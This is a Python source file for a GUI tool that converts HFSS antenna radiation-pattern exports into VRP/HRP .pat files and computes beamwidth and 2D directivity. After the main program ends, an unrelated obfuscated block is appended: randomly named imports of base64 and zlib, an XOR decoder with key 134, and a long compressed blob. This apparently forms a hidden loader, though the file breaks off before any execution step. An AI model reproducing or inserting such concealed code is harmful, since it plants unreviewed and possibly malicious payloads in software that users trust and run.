# -*- coding: utf-8 -*-
"""
CTk PAT Converter — VRP/HRP (v2)

• Lê CSV/TSV exportado do HFSS: [Freq [GHz], Phi [deg], Theta [deg], 10^(dB10normalize(GainL3X)/20) []]
  → Ignora as 2 primeiras colunas e a 1ª linha (cabeçalho).
• Também aceita formatos TXT genéricos (fallback).
• Reamostra:
    - Vertical (VRP):  -90.0 .. +90.0   passo 0.1° (1801 pts)
    - Horizontal (HRP): -180  .. +180    passo 1°   (361 pts)
• Exporta .pat com cabeçalho exigido e terceira coluna 0.
• Plota: VRP (planar) e HRP (polar).
• Calcula (em cada diagrama, com integração de Simpson no intervalo do corte):
    - Diretividade 2D do corte (adimensional)
        HRP: D₂D = 2π / ∫ P(φ) dφ, φ em rad, P = (E/Emax)²
        VRP: D₂D =  π / ∫ P(θ) dθ, θ em rad, P = (E/Emax)²
    - Largura de feixe a meia potência (HPBW), via cruzamento ±3 dB (|E| = √0.5)
"""

from __future__ import annotations

import os
import re
import math
import csv
import tkinter as tk
from io import StringIO
from tkinter import filedialog, messagebox
from typing import List, Tuple, Optional

import numpy as np
import customtkinter as ctk
import matplotlib
matplotlib.use("Agg")
from matplotlib.figure import Figure
from matplotlib.backends.backend_tkagg import FigureCanvasTkAgg

# ----------------------------- Parsing ----------------------------- #
NUM_RE = re.compile(r"^[+-]?(?:\d+(?:\.\d*)?|\.\d+)(?:[eE][+-]?\d+)?$")

def _is_float(s: str) -> bool:
    return bool(NUM_RE.match(s.strip().replace(",", ".")))

def parse_hfss_csv(path: str) -> Tuple[np.ndarray, np.ndarray]:
    """Leitura robusta de CSV/TSV do HFSS (4 colunas).
       Ignora a 1ª linha (header) e as 2 primeiras colunas.
       Retorna (theta_deg, E_over_Emax_linear).
    """
    text = open(path, "r", encoding="utf-8", errors="ignore").read()
    sample = text[:4096]
    dialect = csv.Sniffer().sniff(sample, delimiters=",;\t ")
    reader = csv.reader(StringIO(text), dialect)
    rows = list(reader)
    if not rows:
        raise ValueError("Arquivo vazio.")
    # Se houver header (contém letras), remove a 1ª linha
    if any(ch.isalpha() for ch in "".join(rows[0])):
        rows = rows[1:]
    thetas: List[float] = []
    vals: List[float] = []
    for r in rows:
        if len(r) < 4:
            continue
        t_raw = r[2].strip().replace(",", ".")  # Theta [deg]
        v_raw = r[-1].strip().replace(",", ".")  # última coluna (|E|/Emax linear)
        if _is_float(t_raw) and _is_float(v_raw):
            t = float(t_raw)
            v = float(v_raw)
            if math.isfinite(t) and math.isfinite(v):
                thetas.append(t); vals.append(v)
    if not thetas:
        raise ValueError("Falha ao ler colunas Theta e valor (E/Emax) do CSV.")
    a = np.asarray(thetas, dtype=float)
    v = np.asarray(vals, dtype=float)
    order = np.argsort(a)
    return a[order], v[order]

def parse_generic_table(path: str) -> Tuple[np.ndarray, np.ndarray]:
    """Fallback flexível p/ TXT/TSV com 2+ números por linha.
       Se houver 3+, ignora o primeiro (índice) e usa: ângulo, valor.
    """
    angles: List[float] = []
    vals: List[float] = []
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        for raw in f:
            line = raw.strip()
            if not line:
                continue
            normalized = line.replace(",", ".")
            parts = re.split(r"[\t\s;,,]+", normalized)
            nums = [p for p in parts if _is_float(p)]
            if len(nums) < 2:
                continue
            if len(nums) >= 3:
                angle_deg = float(nums[1]); value = float(nums[2])
            else:
                angle_deg = float(nums[0]); value = float(nums[1])
            if math.isfinite(angle_deg) and math.isfinite(value):
                angles.append(angle_deg); vals.append(value)
    if not angles:
        raise ValueError("Nenhum dado numérico válido encontrado no arquivo.")
    a = np.asarray(angles, dtype=float)
    v = np.asarray(vals, dtype=float)
    order = np.argsort(a)
    return a[order], v[order]

def parse_auto(path: str) -> Tuple[np.ndarray, np.ndarray]:
    """Tenta HFSS CSV; se falhar, usa parser genérico."""
    try:
        return parse_hfss_csv(path)
    except Exception:
        return parse_generic_table(path)

# ----------------------------- Reamostragem ----------------------------- #
def _normalize_linear(values: np.ndarray, mode: str) -> np.ndarray:
    if mode == "none":
        return values
    if mode == "max":
        m = np.max(values) if values.size else 1.0
        return values / (m if m > 0 else 1.0)
    if mode == "rms":
        rms = float(np.sqrt(np.mean(values**2))) if values.size else 1.0
        return values / (rms if rms > 0 else 1.0)
    return values

def resample_vertical(angles_deg: np.ndarray, values: np.ndarray, norm: str = "none") -> Tuple[np.ndarray, np.ndarray]:
    tgt = np.round(np.arange(-90.0, 90.0 + 1e-9, 0.1), 1)
    mask = (angles_deg >= -90.0) & (angles_deg <= 90.0)
    if not np.any(mask):
        raise ValueError("Tabela vertical não cobre o intervalo [-90, 90] graus.")
    a = angles_deg[mask]; v = values[mask]
    a_unique, idx = np.unique(a, return_inverse=True)
    v_accum = np.zeros_like(a_unique); counts = np.zeros_like(a_unique)
    for i, vi in zip(idx, v):
        v_accum[i] += vi; counts[i] += 1
    v_mean = v_accum / np.maximum(counts, 1)
    v_tgt = np.interp(tgt, a_unique, v_mean)
    v_tgt = _normalize_linear(v_tgt, norm)
    return tgt, v_tgt

def _wrap_to_180(a: np.ndarray) -> np.ndarray:
    return (a + 180.0) % 360.0 - 180.0

def resample_horizontal(angles_deg: np.ndarray, values: np.ndarray, norm: str = "none") -> Tuple[np.ndarray, np.ndarray]:
    a = _wrap_to_180(angles_deg); v = values.copy()
    order = np.argsort(a); a = a[order]; v = v[order]
    a_ext = np.concatenate([a, a[:1] + 360.0])
    v_ext = np.concatenate([v, v[:1]])
    tgt = np.arange(-180.0, 181.0, 1.0)
    t_adj = tgt.copy(); t_adj[t_adj < a_ext[0]] += 360.0
    v_tgt = np.interp(t_adj, a_ext, v_ext)
    v_tgt = _normalize_linear(v_tgt, norm)
    return tgt, v_tgt

# ----------------------------- Integração (Simpson) e Métricas ----------------------------- #
def simpson(y: np.ndarray, dx: float) -> float:
    """Simpson composta p/ passo uniforme. Se n for par, usa Simpson em n-1 e trapézio no último."""
    n = len(y)
    if n < 2:
        return 0.0
    if n % 2 == 0:
        s = simpson(y[:-1], dx)
        s += 0.5 * dx * (y[-2] + y[-1])
        return s
    s = y[0] + y[-1] + 4.0 * np.sum(y[1:-1:2]) + 2.0 * np.sum(y[2:-2:2])
    return s * dx / 3.0

def hpbw_deg(angles_deg: np.ndarray, e_lin: np.ndarray) -> float:
    """HPBW por cruzamento em -3 dB: |E|=sqrt(0.5)."""
    if len(angles_deg) < 3:
        return float("nan")
    e = e_lin / (np.max(e_lin) if np.max(e_lin) > 0 else 1.0)
    thr = math.sqrt(0.5)
    i0 = int(np.argmax(e))
    aL = None; aR = None
    # esquerda
    for i in range(i0, 0, -1):
        if e[i] >= thr and e[i-1] < thr:
            a1, a2 = angles_deg[i-1], angles_deg[i]
            y1, y2 = e[i-1], e[i]
            aL = a1 + (thr - y1) * (a2 - a1) / (y2 - y1)
            break
    # direita
    for i in range(i0, len(e)-1):
        if e[i] >= thr and e[i+1] < thr:
            a1, a2 = angles_deg[i], angles_deg[i+1]
            y1, y2 = e[i], e[i+1]
            aR = a1 + (thr - y1) * (a2 - a1) / (y2 - y1)
            break
    if aL is None or aR is None:
        return float("nan")
    return float(aR - aL)

def directivity_2d_cut(angles_deg: np.ndarray, e_lin: np.ndarray, span_deg: float) -> float:
    """Diretividade 2D do corte (adimensional) via Simpson.
       P = e^2 (normalizada por pico); D₂D = (span_rad) / ∫ P(ang) d(ang_rad)
       span_deg: 360 para HRP, 180 para VRP.
    """
    e = e_lin / (np.max(e_lin) if np.max(e_lin) > 0 else 1.0)
    p = e * e
    ang_rad = np.deg2rad(angles_deg)
    if len(ang_rad) < 2:
        return float("nan")
    dx = float(ang_rad[1] - ang_rad[0])
    integral = simpson(p, dx)
    span_rad = math.radians(span_deg)
    if integral <= 0:
        return float("nan")
    return float(span_rad / integral)

# ----------------------------- PAT Writer ----------------------------- #
PAT_HEADER_TEMPLATE = (
    "Edited by {author}\n"
    "98\n"
    "1\n"
    "0 0 0 1 0\n"
    "voltage\n"
)

def write_pat_vertical(path: str, author: str, angles: np.ndarray, values: np.ndarray) -> None:
    with open(path, "w", encoding="utf-8", newline="\n") as f:
        f.write(PAT_HEADER_TEMPLATE.format(author=author))
        for ang, val in zip(angles, values):
            f.write(f"{ang:.1f}\t{val:.4f}\t0\n")

def write_pat_horizontal(path: str, author: str, angles: np.ndarray, values: np.ndarray) -> None:
    with open(path, "w", encoding="utf-8", newline="\n") as f:
        f.write(PAT_HEADER_TEMPLATE.format(author=author))
        for ang, val in zip(angles, values):
            f.write(f"{int(round(ang))}\t{val:.4f}\t0\n")

# ----------------------------- GUI ----------------------------- #
ctk.set_appearance_mode("Dark")
ctk.set_default_color_theme("blue")

class PATConverterApp(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.title("PAT Converter — VRP/HRP (CTk)")
        self.geometry("1200x780")

        # Estado
        self.vertical_path: Optional[str] = None
        self.horizontal_path: Optional[str] = None
        self.base_name_var = tk.StringVar(value="xxx")
               # autor default
        self.author_var = tk.StringVar(value="gecesar")
        self.norm_mode_var = tk.StringVar(value="none")  # none, max, rms
        self.output_dir: Optional[str] = None

        # Dados
        self.v_angles = None; self.v_vals = None
        self.h_angles = None; self.h_vals = None

        # Métricas (labels)
        self.v_hpbw = tk.StringVar(value="HPBW: —")
        self.v_dir  = tk.StringVar(value="D₂D: —")
        self.h_hpbw = tk.StringVar(value="HPBW: —")
        self.h_dir  = tk.StringVar(value="D₂D: —")

        self._build_ui()

    def _build_ui(self):
        # Top controls
        top = ctk.CTkFrame(self)
        top.pack(side=ctk.TOP, fill=ctk.X, padx=12, pady=12)

        ctk.CTkLabel(top, text="Base name:").pack(side=ctk.LEFT, padx=(8, 4))
        ctk.CTkEntry(top, textvariable=self.base_name_var, width=140).pack(side=ctk.LEFT)

        ctk.CTkLabel(top, text="Author:").pack(side=ctk.LEFT, padx=(16, 4))
        ctk.CTkEntry(top, textvariable=self.author_var, width=140).pack(side=ctk.LEFT)

        ctk.CTkLabel(top, text="Normalize:").pack(side=ctk.LEFT, padx=(16, 4))
        ctk.CTkOptionMenu(top, variable=self.norm_mode_var, values=["none", "max", "rms"]).pack(side=ctk.LEFT)

        ctk.CTkButton(top, text="Output dir…", command=self.choose_output_dir).pack(side=ctk.LEFT, padx=(16, 4))
        ctk.CTkButton(top, text="Export PAT", command=self.export_all, fg_color="#22aa66").pack(side=ctk.LEFT, padx=6)

        # Loaders
        loaders = ctk.CTkFrame(self)
        loaders.pack(side=ctk.TOP, fill=ctk.X, padx=12, pady=(0, 8))
        ctk.CTkButton(loaders, text="Load Vertical CSV/TXT (VRP)…", command=self.load_vertical).pack(side=ctk.LEFT, padx=6)
        ctk.CTkButton(loaders, text="Load Horizontal CSV/TXT (HRP)…", command=self.load_horizontal).pack(side=ctk.LEFT, padx=6)
        ctk.CTkButton(loaders, text="Clear", command=self.clear_all).pack(side=ctk.LEFT, padx=6)

        # Plots area
        plots = ctk.CTkFrame(self)
        plots.pack(side=ctk.TOP, fill=ctk.BOTH, expand=True, padx=12, pady=8)

        # Vertical (planar)
        left = ctk.CTkFrame(plots)
        left.pack(side=ctk.LEFT, fill=ctk.BOTH, expand=True, padx=6, pady=6)
        self.fig_v = Figure(figsize=(5.8, 3.8), dpi=100)
        self.ax_v = self.fig_v.add_subplot(111)
        self.ax_v.set_title("Vertical (VRP) — planar")
        self.ax_v.set_xlabel("Theta [deg]")
        self.ax_v.set_ylabel("E/Emax (linear)")
        self.ax_v.grid(True, alpha=0.3)
        self.canvas_v = FigureCanvasTkAgg(self.fig_v, master=left)
        self.canvas_v.get_tk_widget().pack(side=ctk.TOP, fill=ctk.BOTH, expand=True)
        row_v = ctk.CTkFrame(left); row_v.pack(side=ctk.TOP, fill=ctk.X, padx=4, pady=4)
        ctk.CTkLabel(row_v, textvariable=self.v_hpbw).pack(side=ctk.LEFT, padx=6)
        ctk.CTkLabel(row_v, textvariable=self.v_dir ).pack(side=ctk.LEFT, padx=6)

        # Horizontal (polar)
        right = ctk.CTkFrame(plots)
        right.pack(side=ctk.LEFT, fill=ctk.BOTH, expand=True, padx=6, pady=6)
        self.fig_h = Figure(figsize=(5.8, 3.8), dpi=100)
        self.ax_h = self.fig_h.add_subplot(111, projection="polar")
        self.ax_h.set_title("Horizontal (HRP) — polar")
        self.ax_h.grid(True, alpha=0.3)
        self.canvas_h = FigureCanvasTkAgg(self.fig_h, master=right)
        self.canvas_h.get_tk_widget().pack(side=ctk.TOP, fill=ctk.BOTH, expand=True)
        row_h = ctk.CTkFrame(right); row_h.pack(side=ctk.TOP, fill=ctk.X, padx=4, pady=4)
        ctk.CTkLabel(row_h, textvariable=self.h_hpbw).pack(side=ctk.LEFT, padx=6)
        ctk.CTkLabel(row_h, textvariable=self.h_dir ).pack(side=ctk.LEFT, padx=6)

        # Status
        self.status = ctk.CTkLabel(self, text="Ready.")
        self.status.pack(side=ctk.BOTTOM, fill=ctk.X, padx=12, pady=8)

    # -------- Actions -------- #
    def choose_output_dir(self):
        d = filedialog.askdirectory(title="Choose output directory for PAT files")
        if d:
            self.output_dir = d
            self._set_status(f"Output dir: {d}")

    def load_vertical(self):
        path = filedialog.askopenfilename(title="Select vertical table (VRP)",
                                          filetypes=[('CSV/TXT', '*.csv *.tsv *.txt *.dat *.*')])
        if not path:
            return
        try:
            a, v = parse_auto(path)
            self.v_angles, self.v_vals = a, v
            ang_v, val_v = resample_vertical(a, v, norm=self.norm_mode_var.get())
            self._plot_vertical(ang_v, val_v, resampled=True)
            self._metrics_vertical(ang_v, val_v)
            self.vertical_path = path
            self._set_status(f"Vertical loaded: {os.path.basename(path)} — {len(a)} amostras")
        except Exception as e:
            messagebox.showerror("Erro ao carregar VRP", str(e))

    def load_horizontal(self):
        path = filedialog.askopenfilename(title="Select horizontal table (HRP)",
                                          filetypes=[('CSV/TXT', '*.csv *.tsv *.txt *.dat *.*')])
        if not path:
            return
        try:
            a, v = parse_auto(path)
            self.h_angles, self.h_vals = a, v
            ang_h, val_h = resample_horizontal(a, v, norm=self.norm_mode_var.get())
            self._plot_horizontal(ang_h, val_h, resampled=True)
            self._metrics_horizontal(ang_h, val_h)
            self.horizontal_path = path
            self._set_status(f"Horizontal loaded: {os.path.basename(path)} — {len(a)} amostras")
        except Exception as e:
            messagebox.showerror("Erro ao carregar HRP", str(e))

    def clear_all(self):
        self.vertical_path = None
        self.horizontal_path = None
        self.v_angles = self.v_vals = None
        self.h_angles = self.h_vals = None
        self.ax_v.cla(); self.ax_v.set_title("Vertical (VRP) — planar"); self.ax_v.set_xlabel("Theta [deg]"); self.ax_v.set_ylabel("E/Emax (linear)"); self.ax_v.grid(True, alpha=0.3)
        self.canvas_v.draw()
        self.ax_h.cla(); self.ax_h = self.fig_h.add_subplot(111, projection="polar"); self.ax_h.set_title("Horizontal (HRP) — polar"); self.ax_h.grid(True, alpha=0.3)
        self.canvas_h.draw()
        self.v_hpbw.set("HPBW: —"); self.v_dir.set("D₂D: —")
        self.h_hpbw.set("HPBW: —"); self.h_dir.set("D₂D: —")
        self._set_status("Cleared.")

    def export_all(self):
        base = self.base_name_var.get().strip() or "xxx"
        author = self.author_var.get().strip() or "gecesar"
        norm = self.norm_mode_var.get()
        out_dir = self.output_dir or os.path.dirname(self.vertical_path or self.horizontal_path or os.getcwd())

        # Vertical
        if self.v_angles is not None:
            try:
                ang_v, val_v = resample_vertical(self.v_angles, self.v_vals, norm=norm)
                v_path = os.path.join(out_dir, f"{base}_VRP.pat")
                write_pat_vertical(v_path, author, ang_v, val_v)
                self._metrics_vertical(ang_v, val_v)
                self._set_status(f"VRP salvo: {v_path}")
            except Exception as e:
                messagebox.showerror("Erro exportando VRP", str(e))

        # Horizontal
        if self.h_angles is not None:
            try:
                ang_h, val_h = resample_horizontal(self.h_angles, self.h_vals, norm=norm)
                h_path = os.path.join(out_dir, f"{base}_HRP.pat")
                write_pat_horizontal(h_path, author, ang_h, val_h)
                self._metrics_horizontal(ang_h, val_h)
                self._set_status(f"HRP salvo: {h_path}")
            except Exception as e:
                messagebox.showerror("Erro exportando HRP", str(e))

    # -------- Plots -------- #
    def _plot_vertical(self, angles: np.ndarray, values: np.ndarray, resampled: bool = False):
        self.ax_v.cla()
        self.ax_v.set_title("Vertical (VRP) — planar" + (" [resampled]" if resampled else ""))
        self.ax_v.set_xlabel("Theta [deg]")
        self.ax_v.set_ylabel("E/Emax (linear)")
        self.ax_v.grid(True, alpha=0.3)
        self.ax_v.plot(angles, values, linewidth=1.2)
        self.ax_v.set_xlim([-90, 90])
        self.canvas_v.draw()

    def _plot_horizontal(self, angles: np.ndarray, values: np.ndarray, resampled: bool = False):
        self.ax_h.cla()
        self.ax_h = self.fig_h.add_subplot(111, projection="polar")
        self.ax_h.set_title("Horizontal (HRP) — polar" + (" [resampled]" if resampled else ""))
        self.ax_h.grid(True, alpha=0.3)
        ang_wrapped = (angles + 360.0) % 360.0
        theta = np.deg2rad(ang_wrapped)
        self.ax_h.plot(theta, values, linewidth=1.1)
        self.canvas_h.draw()

    # -------- Métricas -------- #
    def _metrics_vertical(self, angles: np.ndarray, values: np.ndarray):
        hpbw = hpbw_deg(angles, values)
        d2d  = directivity_2d_cut(angles, values, span_deg=180.0)
        self.v_hpbw.set(f"HPBW: {hpbw:.2f}°" if math.isfinite(hpbw) else "HPBW: —")
        self.v_dir .set(f"D₂D: {d2d:.3f}"  if math.isfinite(d2d)  else "D₂D: —")

    def _metrics_horizontal(self, angles: np.ndarray, values: np.ndarray):
        hpbw = hpbw_deg(angles, values)
        d2d  = directivity_2d_cut(angles, values, span_deg=360.0)
        self.h_hpbw.set(f"HPBW: {hpbw:.2f}°" if math.isfinite(hpbw) else "HPBW: —")
        self.h_dir .set(f"D₂D: {d2d:.3f}"  if math.isfinite(d2d)  else "D₂D: —")

    # -------- Misc -------- #
    def _set_status(self, text: str):
        self.status.configure(text=text)

if __name__ == "__main__":
    app = PATConverterApp()
    app.mainloop()

# -*- coding: utf-8 -*-
aqgqzxkfjzbdnhz = __import__('base64')
wogyjaaijwqbpxe = __import__('zlib')
idzextbcjbgkdih = 134
qyrrhmmwrhaknyf = lambda dfhulxliqohxamy, osatiehltgdbqxk: bytes([wtqiceobrebqsxl ^ idzextbcjbgkdih for wtqiceobrebqsxl in dfhulxliqohxamy])
lzcdrtfxyqiplpd = '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